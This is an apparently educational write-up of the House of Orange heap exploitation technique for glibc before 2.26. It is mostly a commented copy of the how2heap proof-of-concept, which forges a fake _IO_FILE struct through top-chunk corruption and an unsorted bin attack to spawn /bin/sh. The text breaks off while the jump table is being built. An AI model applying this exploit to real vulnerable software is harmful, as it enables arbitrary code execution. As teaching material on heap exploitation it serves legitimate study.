## House of Orange Explanation

First off, this code from this challenge is from https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c. I basically just took it, and added my own comments. I couldn't figure out this attack in a decent time frame without sufficient documentation like that.

With that being said, here is the well documented source code explaining the attack:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// This code is from: https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c
// I couldn't of figured out this attack without sufficient documentation
// I basically just added comments to it

void pwn(char *inp)
{
    system(inp);
}

void main(void)
{
    // So let's cover House of Orange
    // The purpose of House of Orange is to get code execution
    // We will be doing this by targeting the malloc_printerr function, which is the function that prints out info when it detects memory corruption
    // Like this:

    // Thing is, in older versions of libc, when the function was called it would iterate through a list of
    // _IO_FILE structs stored in _IO_list_all, and actually execute an instruction pointer in that struct
    // This attack will forge a fake _IO_FILE struct that we will write to _IO_list_all, and cause malloc_printerr to run
    // Then it will execute whatever address we have stored in the _IO_FILE structs jump table, and we will get code execution

    // There are several benefits to how we are going to do this
    // First off, with how we do this, we won't ever need to call free directly in the code
    // We will need a libc and heap infoleak to execute this attack
    // In addition to that, we will need a heap overflow that will allow us to reach the top chunk
    // Also this works on versions of libc earlier than 2.26
    // Let's get started!


    // So starting off we will allocate a chunk off of the top chunk.
    // The top chunk is the heap chunk which contains data which hasn't been allocated yet
    // Malloc will allocate data off from this chunk when it can't find chunks from any of the bin lists
    // This call to malloc will set up the heap for us

    unsigned long *ptr, *topChunk;

    // Actual Size of chunk will be 0x400, because of heap metadata
    ptr = malloc(0x3f0);

    // Now the reason why we allocated a chunk that will be 0x400, is due to the top chunk
    // Now the top chunk is usually allocated with a size of 0x21000
    // After that allocation, the size of the top chunk has (0x21000 - 0x400) | 1 = 0x20c01

    // Now we will use the heap overflow to overwrite the size value of the top chunk
    // We will write to it 0xc01, which is a lesser value
    // That way we can cause the behavior in which it increases the top chunk (will be talked about later)
    // We put it's size as `0xc01` for two reasons
    // The first is that it the previous in use bit needs to be set (the 0x1), because if the previous block wasn't in use there should be a consolidation
    // The second is that the size of the top chunk plus the size of the chunk in this case needs to be paged aligned
    // Being page aligned means that the address starts at the start of a memory page

    // However first let's use the heap pointer we have to calculate the address of the top chunk, by adding an offset to it (we can find this offset in a debugger)

    topChunk = (unsigned long *) ((char *)ptr + 0x3f0);

    // Now let's set the size of the top chunk

    topChunk[1] = 0xc01;

    // Now that we have shrunk the size value, we will allocate a chunk size of 0x1000
    // Since the requested size is bigger than the size of the top chunk, the top chunk will be expanded
    // This is done in one of two ways, either by allocating another page with mmap, or extending the top chunk via allocating more memory with brk
    // If the size requested is less than 0x21000, then the brk method is used

    // When this is done sysmalloc will be invoked
    // The new memory will be allocated at the end of the current top chunk, and the old top chunk will be freed
    // This will cause it to enter into the unsorted bin (even though we never directly called free)
    // Assuming that we still have the heap overflow of the old top chunk, this will give us an overflow of an unsorted bin chunk

    /*
        Before 0x1000 Allocation
        +-----+-------------+
        | ptr |  top chunk  | < end of heap right there
        +-----+-------------+


        After 0x1000 Allocation
        +-----+----------------+---------------+
        | ptr |  old top chunk | New Top Chunk | < end of heap right there
        |     |  (now freed)   |               |
        +-----+----------------+---------------+
    */

    malloc(0x1000);

    // Now that our old top chunk is the only chunk in the unsorted bin, it has libc pointers in it
    // We will simulate a libc infoleak, and use it to calculate the address of _IO_list_all

    unsigned long _IO_list_all;
    _IO_list_all = topChunk[2] + 0x9a8;

    // Now we will prep for an unsorted bin attack here
    // For this, we will write to the first value in _IO_list_all the start of the unsorted bin, main_arena+88
    // This value is a ptr to the first chunk in the unsorted bin, which will be the old top chunk we have an overflow to
    // In this case this chunk gets split up to serve allocation requests (which it will) the bk chunk's fwd pointer gets overwritten with the unsorted bin list
    // In other words topChunk->bk->fwd = unsorted bin list (which is a ptr to the old top chunk)

    topChunk[3] = _IO_list_all - 0x10;

    // Now the next thing we will need to set is the size of the old top chunk
    // We will shrink it down to the size of a small bin chunk, specifically 0x61
    // This will serve two purposes
    // When malloc scans through the unsorted bin and sees this chunk, it will try to insert it into small bin 4 due to its size
    // So this chunk will also end up at the head of the small bin 4 list, as we can see here in memory:

    // This will give us a wrote to the fwd pointer of the value we will write to _IO_list_all (which so happens to overlap with small bin 4), since currently our only write is an unsorted bin attack
    // Also this will cause it to fail a check, when it checks the size of the false fwd chunk (which will be 0), which will cause malloc_printerr to be called

    topChunk[1] = 0x61;


    // Now we will finally set up the _IO_FILE struct, which will overlap with the old top chunk currently in the unsorted bin
    // However the first 8 bytes, we will write our input a pointer to it will be passed to the instruction pointer we are calling

    memcpy(topChunk, "/bin/sh", 8);

    // Now for the fake _IO_FILE struct

    _IO_FILE *fakeFp = (_IO_FILE *) topChunk;

    // Set mode to 0
    fakeFp->_mode = 0;

    // We have to pass the check the the write ptr is greater than the write base

    fakeFp->_IO_write_base = (char *) 2;
    fakeFp->_IO_write_ptr = (char *) 3;    

    // Next up we make our jump table
    // This is where our instruction pointer will be called
    // In here I will be setting the instruction pointer equal to the address of pwn
    // However since we have a libc infoleak, we in practice could just set it to system
